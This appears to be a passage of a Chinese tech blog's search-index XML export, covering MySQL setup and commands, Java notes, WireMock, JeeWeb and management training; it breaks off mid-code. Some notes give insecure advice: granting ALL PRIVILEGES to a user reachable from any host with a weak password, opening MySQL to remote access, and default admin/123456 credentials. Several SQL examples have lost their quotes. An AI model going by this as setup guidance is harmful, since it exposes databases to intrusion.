title="apt-get install autoconf"></a>apt-get install autoconf</h1></blockquote><p>for fedora 24-27:</p><blockquote><h1 id="dnf-install-autoconf"><a href="#dnf-install-autoconf" class="headerlink" title="dnf install autoconf"></a>dnf install autoconf</h1></blockquote><p>For Mac</p><blockquote><p>brew install autoconf</p></blockquote><p>对于Mac系统遇到 /etc/权限问题</p><p>参考:<a href="https://apple.stackexchange.com/questions/208815/error-configuring-mcrypt-after-upgrading-to-el-capitan" target="_blank" rel="noopener">https://apple.stackexchange.com/questions/208815/error-configuring-mcrypt-after-upgrading-to-el-capitan</a></p><p>我们可以安装到另外的地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make EXTENSION_DIR=&apos;/usr/local/lib/php/extensions&apos; install</span><br></pre></td></tr></table></figure></p><h3 id="更多Mac的安全策略"><a href="#更多Mac的安全策略" class="headerlink" title="更多Mac的安全策略"></a>更多Mac的安全策略</h3><p>在最新的OSX中限制用户访问某些系统目录<br><a href="https://developer.apple.com/library/content/documentation/Security/Conceptual/System_Integrity_Protection_Guide/Introduction/Introduction.html" target="_blank" rel="noopener">https://developer.apple.com/library/content/documentation/Security/Conceptual/System_Integrity_Protection_Guide/Introduction/Introduction.html</a></p><p>无法访问的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/bin</span><br><span class="line">/sbin</span><br><span class="line">/usr</span><br><span class="line">/System</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/usr/local</span><br><span class="line">/Applications</span><br><span class="line">/Library</span><br><span class="line">~/Library</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Ubuntu上的MySQL安装</title>
      <link href="/mysql/mysql/Mysql%20configuration/"/>
      <url>/mysql/mysql/Mysql%20configuration/</url>
      
        <content type="html"><![CDATA[<h2 id="首先检查系统中是否已经安装了MySQL"><a href="#首先检查系统中是否已经安装了MySQL" class="headerlink" title="首先检查系统中是否已经安装了MySQL"></a>首先检查系统中是否已经安装了MySQL</h2><p>在终端里面输入 sudo netstat -tap | grep mysql</p><p>若没有反映，没有显示已安装结果，则没有安装。若如下显示，则表示已经安装</p><h2 id="如果没有安装，则安装MySQL"><a href="#如果没有安装，则安装MySQL" class="headerlink" title="如果没有安装，则安装MySQL."></a>如果没有安装，则安装MySQL.</h2><p>在终端输入 sudo apt-get install mysql-server mysql-client</p><p>在此安装过程中会让你输入root用户(管理MySQL数据库用户，非Linux系统用户)密码，按照要求输入即可。如下所示：</p><h2 id="测试安装是否成功："><a href="#测试安装是否成功：" class="headerlink" title="测试安装是否成功："></a>测试安装是否成功：</h2><p>在终端输入 sudo netstat -tap | grep mysql</p><h2 id="也可通过登录MySQL测试"><a href="#也可通过登录MySQL测试" class="headerlink" title="也可通过登录MySQL测试"></a>也可通过登录MySQL测试</h2><p>在终端输入 mysql -uroot -p 接下来会提示你输入密码，输入正确密码，即可进入。如下所示：</p><h2 id="MySQL的一些简单管理："><a href="#MySQL的一些简单管理：" class="headerlink" title="MySQL的一些简单管理："></a>MySQL的一些简单管理：</h2><p>启动MySQL服务： ssudo /etc/init.d/mysql start</p><p>停止MySQL服务： sudo /etc/init.d/mysql stop</p><p>修改 MySQL 的管理员密码： sudo mysqladmin -u root password newpassword</p><p>设置远程访问(正常情况下，mysql占用的3306端口只是在IP 127.0.0.1上监听，拒绝了其他IP的访问（通过netstat可以查看到）。取消本地监</p><p>听需要修改 my.cnf 文件：)：</p><p>sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf</p><p>bind-address = 127.0.0.1 //找到此内容并且注释</p><h2 id="MySQL安装后的目录结构分析-此结构只针对于使用apt-get-install-在线安装情况-："><a href="#MySQL安装后的目录结构分析-此结构只针对于使用apt-get-install-在线安装情况-：" class="headerlink" title="MySQL安装后的目录结构分析(此结构只针对于使用apt-get install 在线安装情况)："></a>MySQL安装后的目录结构分析(此结构只针对于使用apt-get install 在线安装情况)：</h2><p>数据库存放目录： /var/lib/mysql/</p><p>相关配置文件存放目录： /usr/share/mysql</p><p>相关命令存放目录： /usr/bin(mysqladmin mysqldump等命令)</p><p>启动脚步存放目录： /etc/rc.d/init.d/</p><h2 id="MySQL图形化管理软件"><a href="#MySQL图形化管理软件" class="headerlink" title="MySQL图形化管理软件"></a>MySQL图形化管理软件</h2><p>一般使用的有两个比较好，一个开源，一个商业收费：</p><p>开源：MySQL Workbench （具体使用介绍随着我的使用，我会慢慢总结）</p><p>商业：Navicat （收费的，有30天体验，之后我相信大家会有办法的）</p><h2 id="开启bin-log-日志"><a href="#开启bin-log-日志" class="headerlink" title="开启bin log 日志"></a>开启bin log 日志</h2>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>实用的SQL语句技巧</title>
      <link href="/mysql/mysql/Useful%20mysql%20statement/"/>
      <url>/mysql/mysql/Useful%20mysql%20statement/</url>
      
        <content type="html"><![CDATA[<p>使用SQL完成文本替换操作</p><blockquote><p>update typecho_contents set text=REPLACE (addr,’<a href="http://bcs.duapp.com/helpjs&#39;,&#39;http://helpjs.bj.bcebos.com/&#39;" target="_blank" rel="noopener">http://bcs.duapp.com/helpjs&#39;,&#39;http://helpjs.bj.bcebos.com/&#39;</a>)</p></blockquote><p> git clone <a href="https://github.com/linksgo2011/tinda_app_cordova.git" target="_blank" rel="noopener">https://github.com/linksgo2011/tinda_app_cordova.git</a><br> cd tinda_app_cordova<br> git pull </p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Team leader 能力模型案例解读</title>
      <link href="/management/management/Team%20leader%20checklist/"/>
      <url>/management/management/Team%20leader%20checklist/</url>
      
        <content type="html"><![CDATA[<ul><li>Develop others<ul><li>主动提出Feedbacks  </li></ul></li><li>Staffing<ul><li>熟悉团队成员构成，如果人员变化及时报告和安排人员</li><li>如果有新人或者毕业生，需要权衡是否会影响团队</li></ul></li><li>Team building<ul><li>增加亲密关系，让团队更加和谐、融洽</li><li>团队成员情绪和压力</li><li>Team的人员成长，注意人员搭配</li><li>提醒Timecard</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> management </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PMP talking</title>
      <link href="/management/management/PMP%20talking/"/>
      <url>/management/management/PMP%20talking/</url>
      
        <content type="html"><![CDATA[<p>名词来源： Project Management Professional (PMP)</p>]]></content>
      
      
      <categories>
          
          <category> management </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mysql 基本管理命令</title>
      <link href="/mysql/mysql/Mysql%20baisc%20operation/"/>
      <url>/mysql/mysql/Mysql%20baisc%20operation/</url>
      
        <content type="html"><![CDATA[<p>一、从命令行登录MySQL数据库服务器 1、登录使用默认3306端口的MySQL</p><p>/usr/local/mysql/bin/mysql -u root -p</p><p>2、通过TCP连接管理不同端口的多个MySQL（注意：MySQL4.1以上版本才有此项功能）</p><p>/usr/local/mysql/bin/mysql -u root -p –protocol=tcp –host=localhost –port=3307</p><p>3、通过socket套接字管理不同端口的多个MySQL</p><p>/usr/local/mysql/bin/mysql -u root -p –socket=/tmp/mysql3307.sock</p><p>4、通过端口和IP管理不同端口的多个MySQL</p><p>/usr/local/mysql/bin/mysql -u root -p -P 3306 -h 127.0.0.1</p><hr><p>二、数据库操作SQL语句 1、显示服务器上当前存在什么数据库</p><p>SHOW DATABASES;</p><p>2、创建名称为rewin的数据库</p><p>CREATE DATABASE rewin;</p><p>3、删除名称为rewin的数据库</p><p>DROP DATABASE rewin;</p><p>4、选择rewin数据库</p><p>USE rewin;</p><hr><p>三、表操作SQL语句（登录之后必须用以上的USE命令选择一个数据库，再进行表操作） 1、显示当前数据库中存在什么表</p><p>SHOW TABLES;</p><p>2、创建数据库表zhangyan：在mysql&gt;后粘贴以下SQL语句，存储引擎为MYISAM，字段id为主键、唯一索引</p><p>。</p><p>CREATE TABLE <code>zhangyan</code> ( <code>id</code> INT( 5 ) UNSIGNED NOT NULL AUTO_INCREMENT , <code>username</code> VARCHAR( 20 ) NOT NULL , <code>password</code> CHAR( 32 ) NOT NULL , <code>time</code> DATETIME NOT NULL , <code>number</code> FLOAT( 10 ) NOT NULL , <code>content</code> TEXT NOT NULL , PRIMARY KEY ( <code>id</code> ) ) ENGINE = MYISAM ;</p><p>3、查看zhangyan表结构</p><p>DESCRIBE zhangyan;</p><p>4、从表中检索信息 4.1、从zhangyan表中检索所有记录</p><p>SELECT * FROM zhangyan;</p><p>4.2、从zhangyan表中检索特定的行：字段username等于abc，字段number等于1，按字段id降序排列</p><p>SELECT * FROM zhangyan WHERE username = abc AND number=1 ORDER BY id DESC;</p><p>4.3、从zhangyan表中检索指定的字段：username和password</p><p>SELECT username, password FROM zhangyan;</p><p>4.4、从zhangyan表中检索出唯一的不重复记录：</p><p>SELECT DISTINCT username FROM zhangyan;</p><p>5、插入信息到zhangyan表</p><p>INSERT INTO zhangyan (id, username, password, time, number, content) VALUES (, abc, 123456,</p><p>2007-08-06 14:32:12, 23.41, hello world);</p><p>6、更新zhangyan表中的指定信息</p><p>UPDATE zhangyan SET content = hello china WHERE username = abc;</p><p>7、删除zhangyan表中的指定信息</p><p>DELETE FROM zhangyan WHERE id = 1;</p><p>8、清空zhangyan表</p><p>DELETE FROM zhangyan;</p><p>9、删除zhangyan表</p><p>DROP TABLE zhangyan;</p><p>10、更改表结构，将zhangyan表username字段的字段类型改为CHAR(25)</p><p>ALTER TABLE zhangyan CHANGE username username CHAR(25);</p><p>11、将当前目录下的mysql.sql导入数据库</p><p>SOURCE ./mysql.sql;</p><hr><p>四、数据库权限操作SQL语句 </p><p>1、创建一个具有root权限，可从任何IP登录的用户sina，密码为zhangyan</p><p>GRANT ALL PRIVILEGES ON <em>.</em> TO sina@% IDENTIFIED BY zhangyan;</p><p>2、创建一个具有”数据操作”、”结构操作”权限，只能从192.168.1.***登录的用户sina，密码为zhangyan</p><p>GRANT SELECT , INSERT , UPDATE , DELETE , FILE , CREATE , DROP , INDEX , ALTER , CREATE</p><p>TEMPORARY TABLES , CREATE VIEW , SHOW VIEW , CREATE ROUTINE, ALTER ROUTINE, EXECUTE ON</p><p><em>.</em> TO <a href="mailto:sina@192.168.1" target="_blank" rel="noopener">sina@192.168.1</a>.% IDENTIFIED BY zhangyan;</p><p>3、创建一个只拥有”数据操作”权限，只能从192.168.1.24登录，只能操作rewin数据库的zhangyan表的用户</p><p>sina，密码为zhangyan</p><p>GRANT SELECT , INSERT , UPDATE , DELETE ON  rewin.zhangyan TO <a href="mailto:sina@192.168.1.24" target="_blank" rel="noopener">sina@192.168.1.24</a> IDENTIFIED BY</p><p>zhangyan;</p><p>4、创建一个拥有”数据操作”、”结构操作”权限，可从任何IP登录，只能操作rewin数据库的用户sina，密码为</p><p>zhangyan</p><p>GRANT SELECT , INSERT , UPDATE , DELETE , CREATE , DROP , INDEX , ALTER , CREATE TEMPORARY</p><p>TABLES , CREATE VIEW , SHOW VIEW , CREATE ROUTINE, ALTER ROUTINE, EXECUTE ON rewin.* TO</p><p>sina@% IDENTIFIED BY zhangyan;</p><p>5、删除用户</p><p>DROP USER sina@%;</p><p>6.MySQL中将字符串aaa批量替换为bbb的SQL语句</p><p>UPDATE 表名 SET 字段名 = REPLACE (字段名, aaa, bbb);</p><p>7.修复损坏的表       ①、用root帐号从命令行登录MySQL： 　　     mysql -u root -p</p><p>　　②、输入root帐号的密码。</p><p>　　③、选定数据库名（本例中的数据库名为student）： 　　use student;</p><p>　　④、修复损坏的表（本例中要修复的表为smis_user_student）： 　　repair table smis_user_student;udent;</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java web project 概览</title>
      <link href="/java/java/java-web-project-overview/"/>
      <url>/java/java/java-web-project-overview/</url>
      
        <content type="html"><![CDATA[<ol><li><p>Java 基础重点回顾</p><ul><li>注解</li><li>异常</li></ul></li><li><p>J2EE 开发常用版本</p><ul><li>Jar 引入Tomcat的J2EE的实现</li><li>J2EE 1.7</li><li>JDK 8</li><li>Tomcat 1.7</li></ul></li><li><p>Spring framework</p><ul><li>Beans</li><li>周边生态</li><li>项目配置 web.xml</li><li>页面渲染<ul><li>JSP</li><li>Velocity</li><li>FreeMaker</li><li>themleaf</li></ul></li></ul></li><li><p>ORM</p><ul><li>Mybatis<ul><li>DAO 接口<ol><li>DTO</li><li>PO</li></ol></li><li>Domain 或者 Model  实体类和数据库对应</li><li>Mapper 使用xml实现和数据库</li></ul></li><li>Hibernate</li><li>Querydsl ORM增强查询工具</li></ul></li><li><p>Validation</p><ul><li>Hibernate Validation 实现</li><li>Java EE Validation 实现</li></ul></li><li><p>授权验证/登录</p><ol><li>intercept 实现</li><li>sharon</li><li>Spring security</li></ol></li><li><p>部署</p><ol><li>tomcat 1.7</li></ol></li><li><p>日志</p><ol><li>log4J</li><li>self4J</li></ol></li><li><p>构建工具</p><ol><li>Maven</li><li>Gradle</li></ol></li><li><p>mapping 工具</p><ol><li>orika</li><li>object mapper</li></ol></li><li><p>其他工具库</p><ol><li>poi 微软文档API</li><li>guava Google工具库</li><li>commons-lang apache 字符串工具</li><li>quartz 计划任务</li></ol></li><li><p>Restful</p><ol><li>hateoas</li><li>jersey </li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>DDI管理培训总结</title>
      <link href="/management/management/DDI%20training/"/>
      <url>/management/management/DDI%20training/</url>
      
        <content type="html"><![CDATA[<ul><li>角色认知<ul><li>角色认知模型</li><li>催化剂型的领导</li></ul></li><li><p>沟通</p><ul><li>常见沟通障碍<ul><li>认知偏差</li><li>听不到位</li><li>无效表达</li><li>缺乏参与</li></ul></li><li>破除沟通障碍<ul><li>听、说、问</li></ul></li><li>分派任务、获取承诺<ul><li>任务应该交给谁</li><li>分配任务时的挑战</li></ul></li></ul></li><li><p>辅导</p><ul><li>何为教练</li><li>诊断问题的四个阶段</li></ul></li><li>反馈<ul><li>高效发展</li><li>发展自我和他人</li><li>高效反馈</li></ul></li></ul><h2 id="管理者角色-沟通和任务分配"><a href="#管理者角色-沟通和任务分配" class="headerlink" title="管理者角色 - 沟通和任务分配"></a>管理者角色 - 沟通和任务分配</h2><ul><li><p>设定目标的SMART原则</p><ul><li>Specific 具体的</li><li>Measurable 可评估的</li><li>Attainable 可实现的</li><li>Relevant 相关联的</li><li>Time Bound 有时限的</li></ul></li><li><p>沟通的几个问题</p><ul><li>由于每个人的背景和环境差异，认知偏差是客观存在的，例如男、女基于性别的认知差异，不同职位的认知差异。</li><li>缺乏有效的聆听，不投入认真听，或者听得内容没有抓住重点</li><li>无效表达，内容啰嗦，没有说到重点</li><li>缺乏参与，不集中精神，不仅沟通无效而且非常不尊重人</li></ul></li><li><p>人际互动的两种需求</p><ul><li>个人需求，每个人需要在沟通中需要被理解、包容和支持，关注个人情绪而不是具体事务。</li><li>实际需求，希望通过沟通能解决的具体问题</li><li>寻求沟通的一方往往需求实际需求，而忽略了被沟通的一方首先需求的是个人需求和情感需要</li></ul></li><li><p>聆听的tips</p><ul><li>专注几种</li><li>理解确认</li><li>回应情绪</li></ul></li><li><p>同理心tips</p><ul><li><p>不该做的</p><ul><li>同理不是同意</li><li>同理不是给建议</li><li>不应该借此八卦、触及隐私</li><li>不应该比惨</li></ul></li><li><p>该做的</p><ul><li>回应</li><li>重述事实</li><li>表达感受</li></ul></li></ul></li><li><p>提问的技巧</p><ul><li>使用开放性问题收集信息</li><li>使用封闭性问题确认信息</li><li>一次一个问题</li><li>保持简单</li><li>更进问题</li><li>广泛到具体漏斗形提问</li></ul></li><li><p>说</p><ul><li>思考这件事对对方的好处</li><li>思考这件事是否损害对方利益</li><li>如果既没有好处，也没有利益损害，请使用请求的方式</li></ul></li><li><p>互动的流程</p><ul><li>定方向 - 表达目的和重要性</li><li>理情况 - 表达事实、数据、问题、疑惑</li><li>想方案 - 方向、资源、支持</li><li>明作法 - 提出Action</li><li><em>然后呢？</em> </li><li>做总结 - 重述要点、给予鼓励、支持和信心，比如随时欢迎来找我。</li></ul></li><li><p>分配任务</p><ul><li>考虑的维度<ul><li>成本</li><li>数量</li><li>时间</li><li>质量</li></ul></li><li>选择合适的人选<ul><li>客观条件</li><li>人员意愿</li></ul></li><li>人们只会做那些考察的而不是强调的</li></ul></li></ul><h2 id="辅导者的角色-高效辅导"><a href="#辅导者的角色-高效辅导" class="headerlink" title="辅导者的角色 - 高效辅导"></a>辅导者的角色 - 高效辅导</h2><ul><li><p>辅导之前准确发现问题</p><ul><li>评价一个人的陷阱<ul><li>过多假设</li><li>严苛效应</li><li>以偏概全</li><li>近期效应</li></ul></li></ul></li><li><p>观察的方法</p><ul><li>S/T Situation Task 情况、任务</li><li>行动 Action</li><li>结果 Results</li></ul></li><li><p>两种辅导</p><ul><li>改进型辅导，不好事情发生之后改进</li><li>发展型辅导，把做好的事情做得更好</li></ul></li></ul><h2 id="管理者的角色-发展和反馈"><a href="#管理者的角色-发展和反馈" class="headerlink" title="管理者的角色 - 发展和反馈"></a>管理者的角色 - 发展和反馈</h2><ul><li>怎样顺势而为<ul><li>个人目标</li><li>组织目标和需求</li><li>团队目标和需求</li></ul></li></ul><p>在这三种之间做出平衡，即可顺势而为g</p><ul><li>学习最有效的方式<ul><li>学习</li><li>评估和考核</li><li>应用</li></ul></li></ul><h2 id="其他启示"><a href="#其他启示" class="headerlink" title="其他启示"></a>其他启示</h2><ul><li>永远优先关注人的感受而不是工作的进展</li><li>做出选择的时候考虑失去什么，是否能承受的了。做出任何选择，得到的不一定能得到，失去的一定会失去。</li></ul>]]></content>
      
      
      <categories>
          
          <category> management </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java object clone</title>
      <link href="/java/java/java-object-clone/"/>
      <url>/java/java/java-object-clone/</url>
      
        <content type="html"><![CDATA[<p>Java变量赋值对于简单变量来说没有什么特别的,对于对象来说有几种情况,</p><ul><li>shallow 赋值</li><li>深拷贝</li><li>克隆</li></ul><h4 id="shallow-赋值"><a href="#shallow-赋值" class="headerlink" title="shallow 赋值"></a>shallow 赋值</h4><p>这种赋值情况为共享内存空间,多个变量指向同一个地址空间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Object obj1 = <span class="keyword">new</span> Object();</span><br><span class="line">Object obj2 = obj1;</span><br></pre></td></tr></table></figure><p>这里的obj1 和 obj2 共享内存空间, 修改其中一个会导致另外一个对象发生变化。</p><h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><p>递归复制对象中所有的成员变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Object obj1 = <span class="keyword">new</span> Object();</span><br><span class="line">obj1.a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">Object obj2 = <span class="keyword">new</span> Object();</span><br><span class="line">obj2.a = obj1.a;</span><br></pre></td></tr></table></figure><h4 id="对象克隆"><a href="#对象克隆" class="headerlink" title="对象克隆"></a>对象克隆</h4><p>使用对象的clone方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Person p = <span class="keyword">new</span> Person(<span class="number">23</span>, <span class="string">"zhang"</span>);</span><br><span class="line">Person p1 = (Person) p.clone();</span><br><span class="line"></span><br><span class="line">System.out.println(p);</span><br><span class="line">System.out.println(p1);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mock工具 wiremock</title>
      <link href="/test/java/Wiremock%20for%20java/"/>
      <url>/test/java/Wiremock%20for%20java/</url>
      
        <content type="html"><![CDATA[<p>Wiremock 是一个Java环境中的Mock工具，非常容易和Junit等单元测试框架集成。</p><h2 id="The-JUnit-4-x-Rule"><a href="#The-JUnit-4-x-Rule" class="headerlink" title="The JUnit 4.x Rule"></a>The JUnit 4.x Rule</h2><p>在JUnit4中可以使用Rule的注解，来直接启动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Rule</span></span><br><span class="line"><span class="keyword">public</span> WireMockRule wireMockRule = <span class="keyword">new</span> WireMockRule(options().port(<span class="number">8888</span>).httpsPort(<span class="number">8889</span>));</span><br></pre></td></tr></table></figure><h2 id="standalone-模式"><a href="#standalone-模式" class="headerlink" title="standalone 模式"></a>standalone 模式</h2><p>这种模式可以使用Wiremock提供的jar运行文件直接启动。</p><blockquote><p>java -jar wiremock-standalone-2.11.0.jar</p></blockquote><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>可以使用录制模式来获取以后Mock的数据</li><li>如果遇到HTTPS需要配置certificate</li><li>更多信息查看文档 <a href="http://wiremock.org/docs/" target="_blank" rel="noopener">http://wiremock.org/docs/</a></li></ol><h2 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h2><p>官网</p><p><a href="http://wiremock.org/" target="_blank" rel="noopener">http://wiremock.org/</a></p>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Jeeweb - SpringMVC+Spring+Hibernate 项目模板</title>
      <link href="/java/java/Jeeweb%20-%20Java%20boilerplate/"/>
      <url>/java/java/Jeeweb%20-%20Java%20boilerplate/</url>
      
        <content type="html"><![CDATA[<p>JeeWeb是一款基于SpringMVC+Spring+Hibernate的敏捷开发系统, 实际上是一个种子项目,但是用来开发CRUD项目绰绰有余了。</p><p>项目地址:<a href="https://www.oschina.net/p/jeeweb" target="_blank" rel="noopener">https://www.oschina.net/p/jeeweb</a><br>github地址:<a href="https://github.com/white-cat/jeeweb" target="_blank" rel="noopener">https://github.com/white-cat/jeeweb</a></p><p>通过学习这个项目,可以学习Java基本的基本选型和配置。<br>技术选型参考如下:</p><h2 id="JeeWeb-功能特点"><a href="#JeeWeb-功能特点" class="headerlink" title="JeeWeb 功能特点"></a>JeeWeb 功能特点</h2><ul><li>采用SpringMVC+Spring+Hibernate+Shiro+ Ehcache+Disruptor+Jquery + Boostrap + Ztree等基础前后端架构架构</li><li>采用面向声明的开发模式， 基于泛型编写极少代码即可实现复杂的数据展示、数据编辑、表单处理等功能，在不使用代码生成器的情况下，也只需要很少的代码就能实现基础的CURD操作，再配合在线开发与代码生成器的使用，更加加快了开发的进度，将J2EE的开发效率成本提高，可以将代码减少60%以上。</li><li>在线开发(通过在线配置实现一个表模型的增删改查功能，无需一行代码，支持用户自定义表单布局)</li><li>代码生成器，支持多种数据模型,根据表生成对应的Entity,Service,Dao,Controller,JSP等,增删改查功能生成直接使用</li><li>UI标签开发库，针对前端UI进行标准封装表，页面统一采用UI标签实现功能：数据datagrid,treegrid,FileInput,Editor,GridSelect等，实现JSP页面零JS，开发维护简洁高效</li><li>查询过滤器：只需前端配置，后台动态拼SQL追加查询条件；支持多种匹配方式（全匹配/模糊查询/包含查询/不匹配查询）</li><li>移动平台支持，对Bootstrap(兼容Html5)进行标准封装</li><li>国际化（支持多语言，国际化的封装为多语言做了便捷支持）</li><li>多数据源（在线配置数据源，数据源工作类封装）</li><li>数据权限：整合Shiro权限</li><li>计划任务控制（在线配置计划任务、方便计划任务的时间调整规划）</li><li>邮件发送（配置邮件模版、邮件帐号的在线配置、邮件异步发送、邮件发送日志功能统计）</li><li>短信发送（配置短信模版、短信帐号的在线配置、短信异步发送、短信发送日志功能统计、支持短信发送平台动态切换）</li><li>多种首页风格切换,支持自定义首页风格。（Inspinia风格|ACE风格）</li><li>数据统计报表：丰富的报表统计功能</li><li>支持多种浏览器: Google, 火狐, IE,360 等</li><li>支持数据库: Mysql,Oracle10g,SqlServer等</li><li>基础权限: 用户，角色，菜单权限</li><li>Web容器测试通过的有Jetty和Tomcat,Weblogic</li><li>要求JDK1.7+</li></ul><h1 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h1><p>1、后端</p><ul><li>核心框架：Spring Framework</li><li>安全框架：Apache Shiro</li><li>视图框架：Spring MVC</li><li>服务端验证：Hibernate Validator</li><li>布局框架：SiteMesh</li><li>任务调度：Quartz</li><li>持久层框架：Hibernate</li><li>数据库连接池：Alibaba Druid</li><li>缓存框架：Ehcache</li><li>并发框架：Disruptor</li><li>日志管理：SLF4J、Log4j</li><li>工具类：Apache Commons、Jackson、Xstream、</li></ul><p>2、前端</p><ul><li>JS框架：jQuery。</li><li>CSS框架：Twitter Bootstrap</li><li>客户端验证：Validform。</li><li>富文本在线编辑：markdown、simditor、Summernote、CodeMirror自由切换</li><li>文件上传工具:Bootstrap fileinput</li><li>数据表格：jqGrid</li><li>对话框：layer</li><li>树结构控件：jQuery zTree</li><li>日期控件： datepicker</li><li>代码高亮： syntaxhighlighter</li></ul><h2 id="简单使用说明"><a href="#简单使用说明" class="headerlink" title="简单使用说明"></a>简单使用说明</h2><ul><li>导入sql/jeeweb-mysql-v1.0.sql文件到mysql数据库</li><li>导入项目到Eclipse.</li><li>修改数据库配置文件dbconfig.properties中的账号密码.</li><li>启动项目,管理员账号admin/密码123456</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>理解 java exception</title>
      <link href="/java/java/java-exception/"/>
      <url>/java/java/java-exception/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是异常和错误"><a href="#什么是异常和错误" class="headerlink" title="什么是异常和错误"></a>什么是异常和错误</h4><p>异常和错误都会阻止当前方法或作用域继续执行,但是异常最大的特点是可以被handle,<br>这是异常和错误最大的区别。</p><p>异常(exception)的例子:</p><ul><li>数据库链接失败</li><li>网络中断</li></ul><p>错误(errors)的例子:</p><ul><li>内存溢出</li><li>CPU超时</li></ul><p>异常可以被捕获然后进行处理,比如渲染错误页面。错误会导致程序直接退出或崩溃。</p><h4 id="Java中的Exception"><a href="#Java中的Exception" class="headerlink" title="Java中的Exception"></a>Java中的Exception</h4><p>Throwable 类是 Java 语言中所有错误或异常的超类（这就是一切皆可抛的东西）。它有两个子类：Error和Exception。</p><p>Error：用于指示合理的应用程序不应该试图捕获的严重问题。这种情况是很大的问题，大到你不能处理了，所以听之任之就行了，你不用管它。比如说VirtualMachineError：当 Java 虚拟机崩溃或用尽了它继续操作所需的资源时，抛出该错误。好吧，就算这个异常的存在了，那么应该何时，如何处理它呢？？交给JVM吧，没有比它更专业的了。</p><p>Exception：它指出了合理的应用程序想要捕获的条件。Exception又分为两类：一种是CheckedException，一种是UncheckedException。这两种Exception的区别主要是CheckedException需要用try…catch…显示的捕获，而UncheckedException不需要捕获。通常UncheckedException又叫做RuntimeException。《effective java》指出：对于可恢复的条件使用被检查的异常（CheckedException），对于程序错误（言外之意不可恢复，大错已经酿成）使用运行时异常（RuntimeException）。</p><p>常见的RuntimeExcepiton有IllegalArgumentException、IllegalStateException、NullPointerException、IndexOutOfBoundsException</p><h4 id="异常的捕获"><a href="#异常的捕获" class="headerlink" title="异常的捕获"></a>异常的捕获</h4><p>一个数组越界的例子<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    System.out.println(ints[<span class="number">4</span>]);</span><br><span class="line">    System.out.println(<span class="string">"是否还能执行"</span>);<span class="comment">// 发生异常以后，后面的代码不能被执行</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IndexOutOfBoundsException e) &#123;</span><br><span class="line">    System.out.println(<span class="string">"数组越界错误"</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"异常出现后"</span>);</span><br></pre></td></tr></table></figure></p><p><strong>catch 规则: 可以使用多个catch 一旦捕获到的类型同样的或者它的父类就停止捕获。</strong><br>根据这个经验我们都需要把特定的一样类放到前面,最后一个catch用一个基本类型来捕获。</p><p>比如 IOException 是FileNotFoundException 的父类,如果FileNotFoundException产生但是产生了其他<br>IOException的异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readFile</span><span 